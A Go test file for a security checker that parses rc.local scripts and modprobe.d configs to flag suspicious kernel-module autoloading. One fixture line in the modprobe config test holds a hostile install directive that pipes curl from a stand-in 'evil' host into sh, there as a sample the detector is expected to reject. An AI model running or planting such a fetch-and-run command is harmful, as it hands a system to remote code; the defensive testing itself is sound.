package kmodule

import (
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"golang.org/x/sys/unix"

	"github.com/waldh4ri/zygarde/internal/core"
	"github.com/waldh4ri/zygarde/internal/fsutil"
)

func TestParseScript(t *testing.T) {
	script := `#!/bin/sh
# insmod /not/this.ko
insmod /etc/intel_audio/intel_audio.ko  # Mélofée
/sbin/modprobe -q nf_conntrack && echo ok
modprobe -r old_module
FOO=1 sudo insmod "/lib/modules/6.1.0/extra/vbox.ko" debug=1
modprobe $MOD
`
	got, err := parseScript(strings.NewReader(script), "/etc/rc.local")
	if err != nil {
		t.Fatal(err)
	}
	var mods []string
	for _, c := range got {
		mods = append(mods, c.How+":"+c.Module)
	}
	want := []string{"insmod:/etc/intel_audio/intel_audio.ko", "modprobe:nf_conntrack", "insmod:/lib/modules/6.1.0/extra/vbox.ko"}
	if strings.Join(mods, " ") != strings.Join(want, " ") {
		t.Errorf("got %v, want %v", mods, want)
	}
	if got[0].Source != "/etc/rc.local:3" || !got[0].Path {
		t.Errorf("first entry = %+v", got[0])
	}
}

func TestParseModprobeConf(t *testing.T) {
	conf := `# comment
blacklist pcspkr
install cramfs /bin/false
install nf_conntrack /usr/sbin/modprobe --ignore-install nf_conntrack $CMDLINE_OPTS && \
	/usr/sbin/sysctl --quiet --pattern 'net[.]netfilter[.]nf_conntrack.*' --system
install adfs /usr/lib/module-init-tools/unblacklist adfs; /sbin/modprobe --ignore-install adfs
install usb_storage /usr/bin/curl -s http://evil/x | sh
options snd slots=1
`
	ins, err := parseModprobeConf(strings.NewReader(conf), "/etc/modprobe.d/x.conf")
	if err != nil {
		t.Fatal(err)
	}
	if len(ins) != 4 {
		t.Fatalf("got %d install directives: %+v", len(ins), ins)
	}
	for i, want := range []bool{true, true, true, false} {
		if got := benignInstall(ins[i].Command); got != want {
			t.Errorf("benignInstall(%q) = %v, want %v", ins[i].Command, got, want)
		}
	}
	if ins[1].Source != "/etc/modprobe.d/x.conf:4" {
		t.Errorf("continued line source = %s", ins[1].Source)
	}
	if benignInstall("/tmp/true") {
		t.Error("true from /tmp accepted")
	}
}

// TestCheckAutoload runs the boot configuration check on a fixture tree.
func TestCheckAutoload(t *testing.T) {
	root := t.TempDir()
	write := func(p, content string) {
		full := filepath.Join(root, p)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("/lib/modules/6.1.0/modules.dep", "kernel/net/netfilter/nf_conntrack.ko.xz: kernel/lib/libcrc32c.ko\nkernel/drivers/char/tpm/tpm-vtpm.ko.zst:\n")
	write("/lib/modules/6.1.0/modules.builtin", "kernel/drivers/char/msr.ko\n")
	write("/lib/modules/6.1.0/modules.alias", "alias char-major-10-* misc\n")
	write("/etc/modules-load.d/ok.conf", "# shipped\nnf_conntrack\ntpm_vtpm\nmsr\nchar-major-10-200\n")
	write("/etc/modules-load.d/bad.conf", "rootkit_mod\n")
	write("/usr/lib/modules-load.d/bad.conf", "overridden_mod\n") // shadowed by /etc
	write("/etc/modules-load.d/ignored.txt", "not_a_conf\n")
	write("/etc/modprobe.d/x.conf", "install cramfs /bin/true\ninstall dummy /tmp/run.sh\n")
	write("/etc/rc.local", "#!/bin/sh\ninsmod /etc/intel_audio/intel_audio.ko\ninsmod /lib/modules/6.1.0/kernel/x.ko\n")

	c := &Cell{root: root, release: "6.1.0"}
	rec := core.NewRecorder(slog.New(slog.NewTextHandler(io.Discard, nil)))
	n := c.checkAutoload(rec)

	var got []string
	for _, f := range rec.Findings() {
		got = append(got, f.Details["module"])
	}
	sort.Strings(got)
	want := []string{"/etc/intel_audio/intel_audio.ko", "dummy"} // rootkit_mod: a name modprobe can't load
	if n != 2 || strings.Join(got, ",") != strings.Join(want, ",") {
		t.Errorf("got %d findings %v, want %v", n, got, want)
	}
}

// A line padded past bufio's default 64 KiB limit must not hide what follows.
func TestParseScriptLongLine(t *testing.T) {
	script := "#!/bin/sh\n# " + strings.Repeat("A", 200*1024) + "\ninsmod /etc/x/x.ko\n"
	got, err := parseScript(strings.NewReader(script), "/etc/rc.local")
	if err != nil || len(got) != 1 || got[0].Module != "/etc/x/x.ko" {
		t.Fatalf("got %+v, %v", got, err)
	}
}

// Files under /home are user-controlled: symlinks and FIFOs there must be
// skipped without blocking, and an unparsable system file is a finding.
func TestCheckAutoloadUnsafeFiles(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "home", "u")
	if err := os.MkdirAll(home, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/dev/null", filepath.Join(home, ".bashrc")); err != nil {
		t.Fatal(err)
	}
	if err := unix.Mkfifo(filepath.Join(home, ".profile"), 0o644); err != nil {
		t.Skipf("mkfifo: %v", err)
	}
	os.MkdirAll(filepath.Join(root, "etc"), 0o755)
	big := "#!/bin/sh\n" + strings.Repeat("#", fsutil.MaxLine+10) + "\ninsmod /etc/x/x.ko\n"
	os.WriteFile(filepath.Join(root, "etc", "rc.local"), []byte(big), 0o644)

	c := &Cell{root: root, release: "6.1.0"}
	rec := core.NewRecorder(slog.New(slog.NewTextHandler(io.Discard, nil)))
	done := make(chan int, 1)
	go func() { done <- c.checkAutoload(rec) }()
	select {
	case n := <-done:
		if n != 1 || !strings.Contains(rec.Findings()[0].Description, "/etc/rc.local could not be parsed completely") {
			t.Fatalf("got %d findings: %+v", n, rec.Findings())
		}
	case <-time.After(10 * time.Second):
		t.Fatal("checkAutoload blocked on a FIFO")
	}
}
